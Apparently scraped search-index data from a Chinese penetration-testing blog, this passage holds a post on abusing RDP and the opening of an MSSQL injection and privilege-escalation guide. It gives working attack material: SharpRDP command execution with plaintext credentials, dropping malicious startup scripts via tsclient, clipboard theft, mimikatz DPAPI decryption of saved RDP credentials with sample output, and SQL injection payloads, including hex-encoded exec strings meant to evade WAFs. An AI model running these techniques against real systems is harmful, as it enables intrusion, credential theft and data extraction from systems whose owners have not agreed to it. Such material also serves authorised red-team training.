协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"3.1 测试 本节介绍的是如何在不通过 GUI 客户端和 Socks 代理的情况下，基于 RDP 协议进行横向移动。 Windows 下 mstscax.dll 库可以执行任何 RDP 功能，此 DLL 是 Microsoft 终端服务的 ActiveX COM 库。通过利用此 DLL，测试人员可以创建控制台应用程序，该控制台应用程序通过 RDP 执行经过身份验证的远程命令执行，而无需 GUI 客户端或 SOCKS 代理。 在 Cobalt Strike 中执行： 直接执行命令： SharpRDP.exe computername=dc01 command=calc username=offense\\administrator password=123456 有两种身份验证方法，一种是提供纯文本凭据（如上），另一种是使用受限管理模式的当前用户上下文。受限管理模式是一种 Windows 保护机制，它要求执行网络类型登录而不是交互式登录，即 PTH。 ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:3:1","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"3.2 场景 有时在某些情况下，RDP 是执行横向移动技术的首选方法，但使用传统的 RDP 客户端 GUI 可能很困难。因此，可以使用上述方法，将命令执行过程隐藏在 RDP 协议中。 其次，可以在没有系统本地管理特权但对系统拥有 RDP 权限的情况下利用 RDP 进行横向移动，可以利用 BloodHound 进行信息收集。 ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:3:2","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"4 RDP 挂盘反打 利用 挂盘监控 + 注入启动项 进行攻击 ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:4:0","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"4.1 原理 tsclient 是通过远程桌面连接到远程计算机时，在远程计算机「网上邻居」中出现的一个机器名，实际为远程计算机分配给本机的名称。 通过 \\\\tsclient\\盘符 可以在远程计算机上访问本机。其访问方式类似于使用 smb 进行文件传输，虽然本质上都是 smb 协议，但是使用 tsclient 无需身份认证，因此可以直接将通过预制手段，使用 tsclient 反向感染。 ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:4:1","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"4.2 利用 通常情况下，tsclient 的利用思路较为简单，通过文件传输将恶意程序脚本写入用户的启动（startup）文件夹，当机器重启时，就会执行恶意程序脚本。 工具：https://github.com/mdsecactivebreach/RDPInception/ ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:4:2","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"4.3 限制条件 mstsc 需要开启驱动器 C 盘，但是默认情况下 mstsc 是不开启磁盘共享功能的。必须要手工开启，如图所示： 当开启 RDP 远程访问时，只有远程登录的用户可以访问 tsclient。其他用户无法访问，包括使用 runas 也无法访问。 虽然限制条件较多，但在实际环境中，很多运维人员为了方便操作，通常会挂载磁盘，因此这一方法并非全然无用，需要根据实际情况判断。猥琐一些的思路：在脚本找不到挂载磁盘的情况下，直接结束 rdpclip.exe 使管理员无法使用剪切板功能，迫使管理员在不清楚原因的状况下，直接重新挂载上磁盘操作。 最后，不同于 smb 上传文件后使用计划任务启动，由于不知道被感染的机器用户身份，因此只能依托于启动项开机自启动。因此，该攻击方式对服务器攻击效果较弱。 ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:4:3","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"5 剪切板利用方法 除了利用文件传输以外，其实还可以尝试利用剪切板劫持的方法进行反向攻击。 ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:5:0","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"5.1 剪切板窃取 5.1.1 原理 在使用 mstsc 进行远程桌面的时候，会启动一个叫 rdpclip.exe 的进程，该进程的功能是同步服务端与客户端的剪贴板。 而这个进程是一个十分有用的进程，如上文提到的，如果直接结束该进程，那么在服务端(远程机器)上将某些数据拷贝到客户端（本地机器）上时，就会发现剪贴板失效，无法复制。 由于启动该进程时，会自动同步剪切板内容，因此当目标目标机器与其他机器使用 mstsc 建立 RDP 远程连接时，就可以通过读取 rdplicp.exe 进程数据，进行剪贴板窃取，以尽可能地获取更多的信息。 此外，由于该进程是后台运行的，当管理员同时用远程桌面登陆多个服务器，在其中的某一个服务器上进行复制拷贝操作时，会将数据同步到所有服务器的 rdplicp.exe 进程。 5.1.2 利用 在 empire 中有一个 Get-ClipboardContents.ps1，可以用 empire 或者 coablt strike 加载该脚本。或者也可以自己编写相关脚本使用。是一个相对简单的工具。 但是需要注意的是，与 tsclient 类似，同计算机的不同用户之间是无法读取的，每一个用户的 rdplicp.exe 是独立启动的。 ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:5:1","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"5.2 剪切板传输恶意文件 当我们用mstsc登陆了一台服务器后，在该服务器上按下复制操作时，会产生一系列操作。 5.2.1 原理 在远程桌面时，使用剪切板传输一个文件的流程如下： 1、在服务器上，“复制\"操作会创建格式为 “CF_HDROP” 的剪贴板数据 2、在客户端计算机中执行「粘贴」时，将触发一系列事件 3、要求服务器上的 rdpclip.exe 进程提供剪贴板的内容，并将其转换为 FileGroupDescriptor(Fgd) 剪贴板格式 4、使用 HdropToFgdConverter::AddItemToFgd() 函数，将文件的元数据添加到描述符中 5、完成后，将 Fgd Blob 发送到服务器上的 RDP 服务 6、服务器只是将其包装并将其发送给客户端 7、客户端将其解包并将其存储在自己的剪贴板中 8、「粘贴」事件将发送到当前窗口（例如，explorer.exe） 9、处理事件并从剪贴板读取数据 10、通过 RDP 连接接收文件的内容 5.2.2 利用 https://github.com/qianshuidewajueji/CVE-2019-0887 https://github.com/0xedh/mstsc-path-traversal ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:5:2","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"6 RDP Thief 每次成功连接到远程主机时，RDP 客户端都会保存远程主机的名称（或IP地址）以及用于登陆的用户名。再次启动 mstsc.exe 时，可以直接从列表中选择远程 RDP 服务器的名称，并且客户端已自动填写用于登陆的用户名。 ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:6:0","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"6.1 获取连接历史记录 \u003c# .SYNOPSISThis script will list the logged-in users' RDP Connections History. #\u003e $AllUser = Get-WmiObject -Class Win32_UserAccount foreach($User in $AllUser) { $RegPath = \"Registry::HKEY_USERS\\\"+$User.SID+\"\\Software\\Microsoft\\Terminal Server Client\\Servers\\\" Write-Host \"User:\"$User.Name Write-Host \"SID:\"$User.SID Write-Host \"Status:\"$User.Status Try { $QueryPath = dir $RegPath -Name -ErrorAction Stop } Catch { Write-Host \"No RDP Connections History\" Write-Host \"----------------------------------\" continue } foreach($Name in $QueryPath) { Try { $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint Write-Host \"User:\"$User Write-Host \"Server:\"$Name } Catch { Write-Host \"No RDP Connections History\" } } Write-Host \"----------------------------------\" } ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:6:1","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"6.2 破解 RDP 连接凭证 破解 RDP 连接凭证的前提是用户在连接远程主机时勾选了保存保存凭证。 查找本地的 Credentials dir /a %userprofile%\\AppData\\Local\\Microsoft\\Credentials\\* 使用 mimikatz 进行操作 mimikatz dpapi::cred /in:C:\\Users\\by\\AppData\\Local\\Microsoft\\Credentials\\DFBE70A7E5CC19A398EBF1B96859CE5D **BLOB** dwVersion : 00000001 - 1 guidProvider : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb} dwMasterKeyVersion : 00000001 - 1 guidMasterKey : {ffc994a1-de8d-4304-9416-31e587f7a8ca} dwFlags : 20000000 - 536870912 (system ; ) dwDescriptionLen : 00000030 - 48 szDescription : Local Credential Data algCrypt : 00006610 - 26128 (CALG_AES_256) dwAlgCryptLen : 00000100 - 256 dwSaltLen : 00000020 - 32 pbSalt : 00fed8ca7ec6d44585dd1fbd8b57e77b6ab0cf318ec5d52d09fd0694ffb89ccb dwHmacKeyLen : 00000000 - 0 pbHmackKey : algHash : 0000800e - 32782 (CALG_SHA_512) dwAlgHashLen : 00000200 - 512 dwHmac2KeyLen : 00000020 - 32 pbHmack2Key : b49ef55f909fa503eda37ddc797c83c99df983920bfb4628e07aac5cb32bb530 dwDataLen : 000000b0 - 176 pbData : 4083f8f501b999a35c4aa57ce732bf52d30a6e604dac5a91b6fd3e65660c52a536025c5126f0d12b85044498deef08a8688b3459f49514ed6ae46271a1cb4cd0e70845d9b6beccbcbe85dead0fb7c80b4f7810add87b75c48592fcbfbbfd94fa4eee8004f8cf6d9619ef4b9af643f4c9ef0e8a2a5b0cd00530a5638cfd114fee4b735ac12eef2c7e6a0364845eb0ee4b3ab121e33324f8d5af48f3422bd47a76ab5e9e9e5a1a383e22fff8bf851b6a2a dwSignLen : 00000040 - 64 pbSign : 7c8dbe7991c6af4d3bfc9f808790a0904738d0ca227bc2ee20ee26cbf06487dd2679e932b27ea0c0cbbe590ee6430641605d7001b2158c8873c5d6a09a9855a8 接下来需要使用的就是 guidMasterKey、pbData 数据。pbData 是凭据的加密数据，guidMasterKey 是凭据的 GUID 使用 sekurlsa::dpapi 根据目标凭据 GUID:{ffc994a1-de8d-4304-9416-31e587f7a8ca}找到其关联的 MasterKey，这个 MasterKey 就是加密凭据的密钥，即解密 pbData 所必须的东西。 解密 dpapi::cred /in:C:\\Users\\by\\AppData\\Local\\Microsoft\\Credentials\\AB07963F1A0A1CB56827E93395597FC6 /masterkey:e01320a53bf9d57da1163c7723a5b3901df5a3fc8e504fc021def2637d19d34c0084a3ac2a0daab3fb9af3f98c48a9a901627dc4b10db087cb357e1d2f8aa18c 参考： https://research.nccgroup.com/2020/05/06/tool-release-socks-over-rdp/ https://3gstudent.github.io/3gstudent.github.io/渗透技巧-使用远程桌面协议建立通道/ https://posts.specterops.io/revisiting-remote-desktop-lateral-movement-8fb905cb46c3 https://github.com/0xthirteen/SharpRDP 利用 mstsc 反向攻击思路整理 https://research.checkpoint.com/reverse-rdp-attack-code-execution-on-rdp-clients/ https://paper.seebug.org/1074/ ","date":"2021-01-22","objectID":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/:6:2","tags":["渗透测试","RDP"],"title":"红蓝对抗中 RDP 协议的利用","uri":"/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试","常用"],"content":"MSSQL 注入与提权方法整理","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"MSSQL 注入与提权方法整理 ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:0:0","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"1 SQL Server 相关基础简介 ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:1:0","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"1.1 默认库介绍 master - 用于记录所有 SQL Server 系统级别的信息，这些信息用于控制用户数据库和数据操作。 model - SQL Server 为用户数据库提供的样板，新的用户数据库都以 model 数据库为基础 msdb - 由 Enterprise Manager 和 Agent 使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。 tempdb - 它为临时表和其他临时工作提供了一个存储区。 信息 这里我们经常要打交道的库也就是 master，其中储存了所有数据库名与存储过程。类比于 MySQL 中的 information_schema 元数据库。 以 master 库为例可以看到上面几个类别，其中视图表 master.dbo.sysdatabases 储存所有数据库名，其他数据库的视图则储存它本库的表名与列名。每一个库的视图表都有 syscolumns 存储着所有的字段，可编程性储存着我们的函数。 selectnamefrommaster.dbo.sysdatabases; 查询所有数据库的名称。 ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:1:1","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"1.2 字段介绍 selecttop1name,xtypefromsysobjects; xtype 可以是下列对象类型中的一种： C = CHECK 约束 D = 默认值或 DEFAULT 约束 F = FOREIGN KEY 约束 L = 日志 FN = 标量函数 IF = 内嵌表函数 P = 存储过程 PK = PRIMARY KEY 约束（类型是 K） RF = 复制筛选存储过程 S = 系统表 TF = 表函数 TR = 触发器 U = 用户表 UQ = UNIQUE 约束（类型是 K） V = 视图 X = 扩展存储过程 ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:1:2","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"2 SQL Server 信息收集 ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:2:0","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"2.1 权限判断 SQL Server 内部按作用范围来分有三大主体: Windows 级别主体 服务器级别主体 数据库级别主体 2.1.1 服务器级别 在微软的官方文档中可以看到， IS_SRVROLEMEMBER ( 'role' [ , 'login' ] ) ，函数 role 的有效值是用户定义的服务器角色和以下固定服务器角色： 返回类型： 返回值 描述 0 login 不是 role 的成员。 1 login 是 role 的成员。 NULL role 或 login 无效，或者没有查看角色成员身份的权限。 最终我们可以构造语句： and1=(selectis_srvrolemember('sysadmin'))and1=(selectis_srvrolemember('serveradmin'))and1=(selectis_srvrolemember('setupadmin'))and1=(selectis_srvrolemember('securityadmin'))and1=(selectis_srvrolemember('diskadmin'))and1=(selectis_srvrolemember('bulkadmin')) 在 SQLMap 中使用 –is-dba 命令可以判断是否为管理员权限 select * from admin where id =1 AND 5560 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(113)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (IS_SRVROLEMEMBER(CHAR(115)+CHAR(121)+CHAR(115)+CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110))=1) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113))) 2.1.2 数据库级别的角色 select IS_MEMBER('db_owner') ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:2:1","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"2.2 基本信息 @@version // 数据库版本 user //获取当前数据库用户名 db_name() // 当前数据库名 其中db_name(N)可以来遍历其他数据库 ;select user //查询是否支持多语句 ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:2:2","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"2.3 判断站库分离 select*frominfowhereid='1'andhost_name()=@@servername;--' 最简单的方法，当然你可以调用 xp_cmdshell 就可以通过 cmd 来判断。 通过简单的判断数据库版本，当前用户权限，我们就可以想下一步怎么去做，比如 2005 的 xp_cmdshell 的权限一般是 system 而 2008 的权限一般是 ntauthority\\network service ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:2:3","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"3 SQL Server 语法 ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:3:0","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"3.1 注释符号 /* -- ;%00 ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:3:1","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"3.2 空白字符 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20 /**/ ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:3:2","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"3.3 运算符号 + 加法运算 - 减法运算 * 乘法运算 / 除法运算，如果两个表达式值都是整数，那么结果只取整数值，小数值将略去 % 取模运算，返回两数相除后的余数 \u0026 位与逻辑运算，从两个表达式中取对应的位。当且仅当输入表达式中两个位的值都为 1 时，结果中的位才被设置为 1，否则，结果中的位被设置为 0 | 位或逻辑运算，从两个表达式中取对应的位。如果输入表达式中两个位只要有一个的值为 1 时，结果的位就被设置为 1，只有当两个位的值都为 0 时，结果中的位才被设置为 0 ^ 位异或运算，从两个表达式中取对应的位。如果输入表达式中两个位只有一个的值为 1 时，结果中的位就被设置为 1；只有当两个位的值都为 0 或 1 时，结果中的位才被设置为0 = 等于 \u003c\u003e 不等于 \u003e 大于 != 不等于 \u003c 小于 !\u003c 不小于 \u003e= 大于或等于 !\u003e 不大于 \u003c= 小于或等于 ALL 如果一组的比较都为 true，则比较结果为 true AND 如果两个布尔表达式都为 true，则结果为 true；如果其中一个表达式为 false，则结果为 false ANY 如果一组的比较中任何一个为 true，则结果为 true BETWEEN 如果操作数在某个范围之内，那么结果为 true EXISTS 如果子查询中包含了一些行，那么结果为 true IN 如果操作数等于表达式列表中的一个，那么结果为 true LIKE 如果操作数与某种模式相匹配，那么结果为 true NOT 对任何其他布尔运算符的结果值取反 OR 如果两个布尔表达式中的任何一个为 true，那么结果为 true SOME 如果在一组比较中，有些比较为 true，那么结果为 true ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:3:3","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"3.4 语法定义符号 \u003c \u003e 尖括号，用于分隔字符串，字符串为语法元素的名称，SQL 语言的非终结符。 ::= 定义操作符。用在生成规则中，分隔规则定义的元素和规则定义。 被定义的元素位于操作符的左边，规则定义位于操作符的右边。 [ ] 方括号表示规则中的可选元素。方括号中的规则部分可以明确指定也可以省略。 { } 花括号聚集规则中的元素。在花括号中的规则部分必须明确指定。 () 括号是分组运算符 ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:3:4","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"4 MSSQL 注入 ","date":"2021-01-20","objectID":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/:4:0","tags":["渗透测试","提权"],"title":"MSSQL 注入与提权方法整理","uri":"/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试","常用"],"content":"4.1 显错注入 4.1.1 原理 MSSQL 报错注入利用的就是显示或隐式转换来报错注入，比如以下就是典型的隐式转换 select*fromadminwhereid=1and(selectuser)\u003e0-- select*fromadminwhereid=1|(selectuser)-- 在将nvarchar值'dbo'转换成数据类型int时失败。 显示转换也就是利用函数来转换，我们经常用到的两个函数就是 cast 和 convert select*fromadminwhereid=1(selectCAST(USERasint))select*fromadminwhereid=1(selectconvert(int,user)) 判断当前数据库： id=1'and db_name()\u003e0;-- 爆表名： id=1' and 1=(select top 1 name from sysobjects where xtype='u' and name !='info');-- 爆列名： id=1' and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'admin') and name\u003c\u003e'id');-- 爆数据： id=1' and 1=(select top 1 username from admin);-- 4.1.2 其它用法 当然查询数据库的所有表还可以使用 INFORMATION_SCHEMA.TABLES select*fromINFORMATION_SCHEMA.TABLESselect*fromINFORMATION_SCHEMA.COLUMNSwhereTABLE_NAME='admin'id=1and1=(selecttop1table_namefrominformation_schema.tables);-- 要判断当前表名和列名，也可以使用 having 1=1 和 group by id=1 having 1=1 爆出当前表和字段： id=1 group by info.id,info.name having 1=1 4.1.3 简单注入绕过 这里引入一个 declare 函数，他是 mssql 声明局部变量的函数，我们经常用它来绕过 waf 对一些关键词的拦截 select*fromadminwhereid=1;declare@anvarchar(2000)set@a='select convert(int,@@version)'exec(@a)-- declare 定义变量，set 设置变量值，exec 执行变量 变量的值是支持 hex 和 ascii 码的，当过滤引号我们就可以这么用把我们的语句编码一下 select*fromadminwhereid=1;declare@svarchar(2000)set@s=0x73656c65637420636f6e7665727428696e742c404076657273696f6e29exec(@s)-- 